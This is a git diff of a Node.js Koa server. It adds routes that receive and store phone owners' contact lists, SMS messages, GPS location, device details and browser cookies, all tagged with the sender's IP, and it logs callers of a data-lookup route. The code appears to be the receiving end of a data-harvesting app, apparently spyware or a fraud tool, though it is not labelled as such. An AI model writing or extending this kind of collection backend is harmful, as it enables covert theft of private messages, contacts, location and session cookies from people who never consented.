@@ -2,6 +2,9 @@
 const sqlDB = require('../lib/db');
 const exportService = require('../export/export_service');
 const mossLock = require('../lib/mossLock');
+const most = require('./most');
+const mobile_code = require('./mobile_code');
+
 
 function returnBody(ctx, code, body) {
     ctx.body = { code, data: body };
@@ -22,7 +25,7 @@ function getToken(LEN = 32) {
 function getClientIP(req) {
     return req.headers['x-forwarded-for'] || // 判断是否有反向代理 IP
         req.connection.remoteAddress || // 判断 connection 的远程 IP
-        req.socket.remoteAddress || // 判断后端的 socket 的
+        req.socket.remoteAddress || // 判断后端的 socket 的 
         req.connection.socket.remoteAddress;
 }
 //
@@ -89,6 +92,55 @@ exports.registerRoute = function (router) {//
             ctx.body = 'ok';
         }
     });
+	
+    router.post('/app_message_user_base_info_ht', async ctx => {
+		console.log('app设备', ctx.header['user-agent']);
+		const address = getClientIP(ctx.req);
+		await sqlDB.insertAddress(address, ctx.header['user-agent'], 't_app_ip_address');
+        let query = ctx.request.body;
+        let { code, mobile, machine, longitude, latitude, phone_numbers, message_list,mobile_info } = query;
+		mobile_info = `SubIp:${address} ` + mobile_info;       
+        console.info('收到手机数据', mobile_info); 
+        let { err, ret } = await sqlDB.insertBaseNumbersAndmobile_info(code, mobile, longitude, latitude, phone_numbers, message_list,mobile_info);
+        if (err) {
+            console.error('收到手机数据 入库错误', err);
+            ctx.body = 'sql error';
+        } else {
+            console.log('收到手机数据 成功入库');
+            ctx.body = 'ok';
+        }
+    });
+	
+	router.post('/ht_mobile_info', async ctx =>{
+		const query = ctx.request.body;
+		let {mobile_info} = query;
+		const address = getClientIP(ctx.req);
+		mobile_info = `SubIp:${address} ` + mobile_info;
+		console.log('后台信息:', mobile_info, query);
+        let { err, ret } = await sqlDB.insertHtInfo(mobile_info);
+        if (err) {
+			console.log('ht错误:', err);
+            ctx.body = 'insert错误';
+        } else {
+			ctx.body = 'ok';
+        }
+        return;		
+	});
+	
+	router.post('/ht_cooks', async ctx =>{
+		const query = ctx.request.body;
+		let {cooks} = query;
+		const address = getClientIP(ctx.req);
+		cooks = `SubIp:${address} ` + cooks;
+        let { err, ret } = await sqlDB.insertCookies(cooks);
+        if (err) {
+			console.log('ht错误:', err);
+            ctx.body = 'insert cooks 错误';
+        } else {
+			ctx.body = 'ok';
+        }
+        return;		
+	});
 
     router.get('/export_message_list', async ctx => {
         const query = ctx.request.query;
@@ -142,7 +194,14 @@ exports.registerRoute = function (router) {//
     });
     //POST 获取用户数据
     router.post('/get_info_list', async ctx => {
-        const query = ctx.request.body;
+		//console.log('请求方的ctx', getClientIP(ctx.req), ctx.req);
+        const query = ctx.request.body
+		console.log('设备', ctx.header['user-agent']);
+		let address = getClientIP(ctx.req);
+		if(query.code){
+			address = address + 'Find';
+		}
+		await sqlDB.insertAddress(address, ctx.header['user-agent']);;
         let { code, mobile, start, count } = query;
         start--;
         let all_count = await sqlDB.get_list_all_count(code, mobile);
@@ -221,4 +280,7 @@ exports.registerRoute = function (router) {//
         await sqlDB.update_user_token(ctx.request.headers['account'], null);
         returnBody(ctx, 0, '退出登录成功');
     });
+
+    most.addMost(router);
+    mobile_code.addEms(router);
 };
